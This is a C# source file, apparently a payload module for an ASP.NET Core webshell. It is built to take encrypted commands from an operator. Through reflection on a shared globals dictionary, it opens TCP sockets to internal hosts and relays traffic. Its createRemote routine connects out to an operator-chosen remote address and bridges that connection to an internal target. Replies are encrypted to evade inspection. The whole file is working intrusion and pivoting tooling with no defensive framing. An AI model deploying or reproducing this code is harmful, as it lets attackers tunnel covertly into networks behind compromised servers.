using System.Net;
using System.Net.Sockets;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;

    public static string extraData;

    private DefaultHttpContext context;

    private object current;


    public static string action;


    public static string targetIP;


    public static string targetPort;


    public static string socketHash;


    public static string remoteIP;


    public static string remotePort;

    public Dictionary<string, Object> globals = new Dictionary<string, Object>();

    public string error_msg;

    public override bool Equals(object obj)
    {
        this.init(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            if (U.action.Equals("createRemote"))
            {
                dictionary = this.createRemote();
            }
            else if (U.action.Equals("createLocal"))
            {
                dictionary = this.createLocal();
            }
            else if (U.action.Equals("read"))
            {
                dictionary = this.readLocal();
            }
            else if (U.action.Equals("write"))
            {
                dictionary = this.writeLocal();
            }
            else if (U.action.Equals("closeRemote"))
            {
                dictionary = this.closeRemote();
            }
            else if (U.action.Equals("closeLocal"))
            {
                dictionary = this.closeLocal();
            }
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        this.Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
        return false;
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
                if (!globals.ContainsKey("flag")) globals["flag"] = "true";
            }
        }
    }


    private void createRemoteThread()
    {
        while ((bool)this.sessionGet("remoteRunning"))
        {
            try
            {
                IPEndPoint ipendPoint = new IPEndPoint(IPAddress.Parse(U.remoteIP), int.Parse(U.remotePort));
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(ipendPoint);
                string text = string.Concat(new object[]
                {
                    "remote_remote_",
                    socket.LocalEndPoint,
                    "_",
                    U.targetIP,
                    "_",
                    U.targetPort
                });
                this.sessionSet(text, socket);
                byte[] array = new byte[512];
                int num;
                if ((num = socket.Receive(array)) > 0)
                {
                    byte[] array2 = new byte[num];
                    Buffer.BlockCopy(array, 0, array2, 0, num);
                    IPEndPoint ipendPoint2 = new IPEndPoint(IPAddress.Parse(U.targetIP), int.Parse(U.targetPort));
                    Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    string text2 = string.Concat(new object[]
                    {
                        "remote_local_",
                        socket2.LocalEndPoint,
                        "_",
                        U.targetIP,
                        "_",
                        U.targetPort
                    });
                    this.sessionSet(text2, socket2);
                    socket2.Connect(ipendPoint2);
                    socket2.Send(array2, num, SocketFlags.None);
                    Dictionary<string, string> dictionary = new Dictionary<string, string>();
                    dictionary.Add("type", "read");
                    dictionary.Add("localKey", text2);
                    dictionary.Add("remoteKey", text);
                    Dictionary<string, string> dictionary2 = new Dictionary<string, string>();
                    dictionary2.Add("type", "write");
                    dictionary2.Add("localKey", text2);
                    dictionary2.Add("remoteKey", text);
                    Thread thread = new Thread(new ParameterizedThreadStart(this.remoteSession));
                    thread.Start(dictionary);
                    Thread thread2 = new Thread(new ParameterizedThreadStart(this.remoteSession));
                    thread2.Start(dictionary2);
                    this.sessionSet("remoteReader", thread);
                    this.sessionSet("remoteWriter", thread2);
                }
            }
            catch (SocketException)
            {
            }
        }
    }


    private Dictionary<string, string> createRemote()
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        this.sessionSet("remoteRunning", true);
        Thread thread = new Thread(new ThreadStart(this.createRemoteThread));
        thread.Start();
        dictionary.Add("status", "success");
        dictionary.Add("msg", "ok");
        return dictionary;
    }


    private Dictionary<string, string> closeRemote()
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            this.sessionSet("remoteRunning", false);
            try
            {
                ((Thread)this.sessionGet("remoteReader")).Interrupt();
            }
            catch
            {
            }

            try
            {
                ((Thread)this.sessionGet("remoteWriter")).Interrupt();
            }
            catch
            {
            }

            foreach (string text in this.sessionKeys())
            {
                if (text.StartsWith("remote"))
                {
                    this.sessionRemove(text);
                }
            }

            dictionary.Add("status", "success");
            dictionary.Add("msg", "ok");
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        return dictionary;
    }


    private Dictionary<string, string> createLocal()
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string text = string.Concat(new string[]
        {
            "local_",
            U.targetIP,
            "_",
            U.targetPort,
            "_",
            U.socketHash
        });
        IPEndPoint ipendPoint = new IPEndPoint(IPAddress.Parse(U.targetIP), int.Parse(U.targetPort));
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        socket.Connect(ipendPoint);
        socket.Blocking = false;
        this.sessionSet(text, socket);
        dictionary.Add("status", "success");
        dictionary.Add("msg", "ok");
        return dictionary;
    }


    private Dictionary<string, string> closeLocal()
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            foreach (string text in this.sessionKeys())
            {
                if (text.StartsWith("local"))
                {
                    this.sessionRemove(text);
                }
            }

            dictionary.Add("status", "success");
            dictionary.Add("msg", "ok");
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        return dictionary;
    }


    private Dictionary<string, string> readLocal()
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string text = string.Concat(new string[]
        {
            "local_",
            U.targetIP,
            "_",
            U.targetPort,
            "_",
            U.socketHash
        });
        Socket socket = (Socket)this.sessionGet(text);
        byte[] array = new byte[512];
        try
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
                {
                    while (socket.Available > 0)
                    {
                        int num = socket.Receive(array);
                        binaryWriter.Write(array, 0, num);
                    }

                    dictionary.Add("status", "success");
                    dictionary.Add("msg", Convert.ToBase64String(memoryStream.ToArray()));
                }
            }
        }
        catch (SocketException ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        return dictionary;
    }


    private Dictionary<string, string> writeLocal()
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string text = string.Concat(new string[]
        {
            "local_",
            U.targetIP,
            "_",
            U.targetPort,
            "_",
            U.socketHash
        });
        Socket socket = (Socket)this.sessionGet(text);
        try
        {
            byte[] array = Convert.FromBase64String(U.extraData);
            socket.Send(array);
            dictionary.Add("status", "success");
            dictionary.Add("msg", "ok");
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        return dictionary;
    }


    private void remoteSession(object paramsMapObj)
    {
        Dictionary<string, string> dictionary = (Dictionary<string, string>)paramsMapObj;
        string text = dictionary["type"];
        string text2 = dictionary["localKey"];
        string text3 = dictionary["remoteKey"];
        Socket socket = (Socket)this.sessionGet(text2);
        Socket socket2 = (Socket)this.sessionGet(text3);
        if (text.Equals("read"))
        {
            while ((bool)this.sessionGet("remoteRunning"))
            {
                byte[] array = new byte[512];
                try
                {
                    int num;
                    while ((num = socket2.Receive(array)) > 0)
                    {
                        byte[] array2 = new byte[num];
                        Buffer.BlockCopy(array, 0, array2, 0, num);
                        socket.Send(array2, num, SocketFlags.None);
                    }
                }
                catch (SocketException)
                {
                }
            }
        }
        else
        {
            while ((bool)this.sessionGet("remoteRunning"))
            {
                byte[] array = new byte[512];
                try
                {
                    int num;
                    while ((num = socket.Receive(array)) > 0)
                    {
                        byte[] array2 = new byte[num];
                        Buffer.BlockCopy(array, 0, array2, 0, num);
                        socket2.Send(array2, num, SocketFlags.None);
                    }
                }
                catch (SocketException)
                {
                }
            }
        }
    }

    private void sessionSet(string key, object value)
    {
        string sessionKey = this.Session?.Id ?? this.sessionId;


        Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[sessionKey];


        if (dictionary.ContainsKey(key))
        {
            dictionary[key] = value;
        }
        else
        {
            dictionary.Add(key, value);
        }
    }


    private object sessionGet(string key)
    {
        object obj;
        if (this.Session == null)
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.sessionId];
            obj = dictionary[key];
        }
        else
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.Session.Id];
            obj = dictionary[key];
        }

        return obj;
    }


    private List<string> sessionKeys()
    {
        List<string> list = new List<string>();
        if (this.Session == null)
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.sessionId];
            list.AddRange(dictionary.Keys);
        }
        else
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.Session.Id];
            list.AddRange(dictionary.Keys);
        }

        return list;
    }


    private void sessionRemove(string key)
    {
        if (this.Session == null)
        {
            Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[this.sessionId];
            dictionary.Remove(key);
        }
        else
        {
            ((Dictionary<string, object>)this.globals[this.Session.Id]).Remove(key);
        }
    }


    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    public void global_init()
    {
        if (globals == null)
        {
            globals = new Dictionary<string, object>();
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        this.global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillSessionHandler();
        this.fillParams();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}